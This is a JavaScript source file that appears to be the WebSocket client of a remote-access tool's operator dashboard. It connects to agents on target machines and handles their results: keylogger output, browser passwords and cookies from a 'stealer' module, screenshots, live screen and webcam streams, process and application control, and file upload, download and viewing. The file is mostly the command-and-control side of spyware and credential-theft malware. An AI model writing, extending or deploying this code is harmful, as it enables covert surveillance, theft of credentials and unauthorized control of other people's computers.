// =================================================================
// CORE: WEBSOCKET MANAGER
// =================================================================

import { state, resetAppState } from './state.js';
import { $, downloadBase64File } from './utils.js';

import { 
    renderProcessTable, 
    renderStopProcList, 
    renderAppTable, 
    renderStopAppList 
} from '../modules/system.js';

import { 
    handleScreenshotResult, 
    handleScreenFrame, 
    resetScreenUI 
} from '../modules/screen.js';

import { 
    handleWebcamStatus, 
    handleWebcamVideo, 
    handleWebcamFrame, 
    clearWebcamStreamUI 
} from '../modules/webcam.js';

import { handleKeyEvent } from '../modules/keylogger.js';
import { renderPasswordModal, handleCookiesResult } from '../modules/stealer.js';
import { 
    renderDriveTree, 
    appendTreeChildren, 
    renderFileList, 
    unlockFileUI, 
    handleFileView, 
    sendNextChunk, 
    resetUploadState 
} from '../modules/fileManager.js';

let ws = null;

export function connectWs() {
    const wsUrlInput = $('#ws-url-input');
    const url = wsUrlInput ? wsUrlInput.value : '';
    
    if (!url) return alert('Enter WebSocket URL');
    console.log("Connecting to:", url);

    try {
        ws = new WebSocket(url);
    } catch (e) {
        return alert("Invalid URL");
    }

    ws.onopen = () => {
        setConnectedState(true, state.currentAgentId);
        if (state.currentAgentId) loadDataForCurrentView();
    };

    ws.onclose = () => {
        setConnectedState(false);
        ws = null;
        resetUI();
    };

    ws.onerror = (e) => console.log('Connection failed/closed');
    ws.onmessage = onWsMessage;
}

export function disconnectWs() {
    if (ws) ws.close();
}

export function sendWsMessage(payload) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        if (state.currentAgentId) {
            payload.agentId = state.currentAgentId;
            ws.send(JSON.stringify(payload));
        } else {
            alert('Please select an agent first (Scan LAN)');
        }
    }
}

export function isWsConnected() {
    return ws && ws.readyState === WebSocket.OPEN;
}

export function setConnectedState(isConnected, agentName = null) {
    const statusPill = $('#status-pill');
    const statusText = $('#status-pill .status-text');
    const btnConnect = $('#btn-connect');
    const btnDisconnect = $('#btn-disconnect');
    const wsUrlInput = $('#ws-url-input');

    if (!statusPill) return;

    if (isConnected) {
        statusPill.classList.remove('disconnected');
        statusPill.classList.add('connected');
        if (statusText) statusText.textContent = agentName ? `Connected: ${agentName}` : 'Connected';
        if (btnConnect) btnConnect.classList.add('hidden');
        if (btnDisconnect) btnDisconnect.classList.remove('hidden');
        if (wsUrlInput) wsUrlInput.disabled = true;
    } else {
        statusPill.classList.remove('connected');
        statusPill.classList.add('disconnected');
        if (statusText) statusText.textContent = 'Disconnected';
        if (btnConnect) btnConnect.classList.remove('hidden');
        if (btnDisconnect) btnDisconnect.classList.add('hidden');
        if (wsUrlInput) wsUrlInput.disabled = false;
        // state.currentAgentId = null;
    }
}

function onWsMessage(event) {
    const msg = JSON.parse(event.data);
    const modalAppEl = document.getElementById('modal-stop-app');
    const modalProcEl = document.getElementById('modal-stop-proc');
    const isStopAppOpen = modalAppEl && !modalAppEl.classList.contains('hidden');
    const isStopProcOpen = modalProcEl && !modalProcEl.classList.contains('hidden');

    switch (msg.type) {
        case 'process_list':
            if (isStopProcOpen) renderStopProcList(msg.data);
            else renderProcessTable(msg.data);
            break;
        case 'application_list':
            if (isStopAppOpen) renderStopAppList(msg.data);
            else renderAppTable(msg.data);
            break;
        case 'screenshot':
            handleScreenshotResult(msg.data);
            break;
        case 'screen_frame':
            handleScreenFrame(msg.data);
            break;
        case 'webcam_recording_status':
            handleWebcamStatus(msg);
            break;
        case 'webcam_video':
            handleWebcamVideo(msg.data);
            break;
        case 'webcam_frame':
            handleWebcamFrame(msg.data);
            break;
        case 'key_event':
            handleKeyEvent(msg.key_code, msg.key_char);
            break;
        case 'passwords_result':
            const browserName = msg.browser ? msg.browser.toUpperCase() : "BROWSER";
            if (!msg.data || msg.data.length === 0) alert(`No passwords found for ${browserName}.`);
            else renderPasswordModal(msg.data, browserName);
            break;
        case 'cookies_result':
            handleCookiesResult(msg);
            break;
        case 'error':
            alert("Server Error: " + msg.message);
            break;
        case 'status':
            if (state.currentView === 'files') unlockFileUI();
            if (msg.success && msg.message === "Chunk received") {
                if (state.uploadState.active) {
                    sendNextChunk();
                } else {
                    console.warn("Nhận được tín hiệu chunk từ server nhưng client đã hủy upload.");
                }
            }
            if (msg.success) {
                if (isStopAppOpen) sendWsMessage({ command: 'list_applications' });
                if (isStopProcOpen) sendWsMessage({ command: 'list_processes' });
                if (state.currentView.includes('process')) sendWsMessage({ command: 'list_processes' });
                if (state.currentView.includes('app')) sendWsMessage({ command: 'list_applications' });
                if (state.currentView === 'files') sendWsMessage({ command: 'fs_list', path: state.currentPath, context: 'view' });
            } else {
                if (state.uploadState.active) {
                    console.error("Upload error form server:", msg.message);
                    resetUploadState(); 
                    alert('Lỗi Upload: ' + msg.message + '. Đã reset trạng thái.');
                }
                if (state.uploadState.active) resetUploadState(); 
                if (state.currentView === 'files') {
                    const grid = document.getElementById('file-grid');
                    if (grid) { grid.style.opacity = '1'; grid.style.pointerEvents = 'auto'; }
                }
                if (msg.message === 'capture failed') {
                    $('#capture-spinner').classList.add('hidden');
                    $('#capture-placeholder').parentElement.classList.remove('hidden');
                } else alert('Error: ' + msg.message);
            }
            break;
        case 'drive_list':
            renderDriveTree(msg.data);
            break;
        case 'file_list':
            unlockFileUI();
            if (msg.context === 'tree') appendTreeChildren(msg.path, msg.data);
            else renderFileList(msg.path, msg.data);
            break;
        case 'file_download':
            if (msg.success) downloadBase64File(msg.data, msg.name);
            else alert("Download failed!");
            break;
        case 'file_view':
            if (msg.success) handleFileView(msg.name, msg.data, msg.path);
            else alert("Cannot view file: " + msg.message);
            break;
    }
}

export function loadDataForCurrentView() {
    const id = state.currentView;
    if (id === 'processes-table') sendWsMessage({ command: 'list_processes' });
    else if (id === 'applications-table') sendWsMessage({ command: 'list_applications' });
    else if (id === 'files') {
        sendWsMessage({ command: 'fs_drives' });
        sendWsMessage({ command: 'fs_list', path: state.currentPath, context: 'view' });
    }
}

function resetUI() {
    if ($('#processes-table tbody')) $('#processes-table tbody').innerHTML = '';
    if ($('#apps-table tbody')) $('#apps-table tbody').innerHTML = '';
    const keylogOutput = $('#keylog-output');
    if (keylogOutput) keylogOutput.textContent = 'Waiting...';
    const keylogToggle = $('#keylog-toggle');
    if (keylogToggle) keylogToggle.checked = false;
    resetAppState();
    clearWebcamStreamUI();
    resetScreenUI();
}